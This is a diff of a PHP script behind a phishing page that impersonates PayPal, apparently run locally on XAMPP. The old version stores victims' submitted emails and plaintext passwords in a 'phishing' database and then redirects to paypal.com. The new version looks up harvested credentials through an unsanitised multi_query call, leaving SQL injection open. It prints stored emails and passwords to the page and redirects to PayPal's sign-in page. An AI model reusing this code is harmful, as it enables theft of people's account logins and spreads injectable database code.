@@ -1,35 +1,46 @@
 <?php
-// Database connection details
-$servername = "127.0.0.1"; // Because you're running locally
-$username = "root";        // Default username for XAMPP
-$password = "";            // Default password for XAMPP is empty
-$dbname = "phishing";   // The name of the database you created
 
-// Create connection
+// connection details
+$servername = "127.0.0.1"; 
+$username = "root";        
+$password = "";            
+$dbname = "phishing";      
+
+// connection to database
 $conn = new mysqli($servername, $username, $password, $dbname);
 
-// Check connection
 if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 
-// Get the form input
 $email = $_POST['email'];
-$password = $_POST['password'];
 
-// Obfuscate the password slightly before storing
-//$obfuscated_password = substr($password, 0, 2) . str_repeat('*', strlen($password) - 2);
+$sql = "SELECT * FROM credentials WHERE email = '$email'";
+echo "Executing query: $sql<br>";
 
-// Insert the email and obfuscated password into the database
-$sql = "INSERT INTO credentials (email, password) VALUES ('$email', '$password')";
-
-if ($conn->query($sql) === TRUE) {
-    header("Location: https://www.paypal.com");
-    exit();
+// executes
+if ($conn->multi_query($sql)) {
+    do {
+        
+        if ($result = $conn->store_result()) {
+            echo "<h2>Search Results:</h2>";
+            while ($row = $result->fetch_assoc()) {
+                echo "Email: " . $row["email"] . " - Password: " . $row["password"] . "<br>";
+            }
+            $result->free();
+        }
+    } while ($conn->more_results() && $conn->next_result());
 } else {
-    echo "Error: " . $sql . "<br>" . $conn->error;
+    echo "Error executing query: " . $conn->error;
 }
 
-// Close the connection
+// closes
 $conn->close();
 ?>
+
+<script>
+setTimeout(function() {
+    // redirect
+    window.location.href = "https://www.paypal.com/signin";
+}, 0);
+</script>
